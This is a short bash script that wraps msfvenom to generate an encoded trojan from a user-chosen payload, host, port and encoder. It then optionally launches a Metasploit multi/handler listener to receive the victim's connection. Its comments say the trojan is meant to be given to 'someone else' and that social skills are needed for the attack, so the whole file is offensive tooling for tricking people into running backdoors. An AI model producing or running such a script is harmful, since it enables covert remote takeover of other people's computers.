#!/bin/bash
#Note for wan you must portforward your router, Or generate a trojan for someone else who was.
#You must have good social skills to use this attack method successfully 
clear
cat banners/banner1
cd payload
echo "------------------------------------------------------------------------------------------"
echo 'payload: '
read -r -e payload
echo "------------------------------------------------------------------------------------------"
echo "Getting Current WAN IP"
echo "Your WAN IP is" && wget -qO- ifconfig.co
echo 'lhost: '
read -r -e lhost
echo "------------------------------------------------------------------------------------------"
echo 'lport: '
read -r -e lport
echo "------------------------------------------------------------------------------------------"
echo 'encoder: ' && cd ../encoder
read -r -e encoder
echo "------------------------------------------------------------------------------------------"
echo 'ittirations: '
read -r -e itirations
echo "------------------------------------------------------------------------------------------"
echo 'format: ' && cd ../format
read -r -e format 
echo "------------------------------------------------------------------------------------------"
echo 'output: ' && cd ../
read -r -e output
msfvenom -p $payload lhost=$lhost lport=$lport -e $encoder -i $itirations -f $format -o $output

echo "Would you like to start a listener for your newly generated trojan?"
select yn in "Yes" "No"; do
    case $yn in
        Yes ) msfconsole -x "use exploit/multi/handler; set payload '${payload}'; set LHOST '${lhost}'; set LPORT '${lport}'; exploit" ; break;;
        No ) exit;;
    esac
done

